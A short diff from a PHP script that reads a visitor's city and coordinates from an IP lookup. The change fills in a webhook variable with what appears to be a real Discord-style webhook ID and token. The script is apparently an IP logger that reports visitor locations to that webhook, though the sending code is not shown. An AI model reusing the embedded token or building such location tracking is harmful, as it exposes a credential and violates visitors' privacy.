@@ -22,7 +22,7 @@ $City = $Info->city;
 $COORD = "$Info->lat, $Info->lon"; // Coordinates
 
 //Variables
-$Webhook    = ""; //Webhook here.
+$Webhook    = "1372380591366078544/7Rpt5FzAlFCKoQWbuV0mp0KsLiHQIKYT1pD1JqiybhVGSfF0X1D5OtZBN5m34vARGOGk"; //Webhook here.
 
 $WebhookTag = "Showcase"; //This will be the name of the webhook when it sends a message.  
 
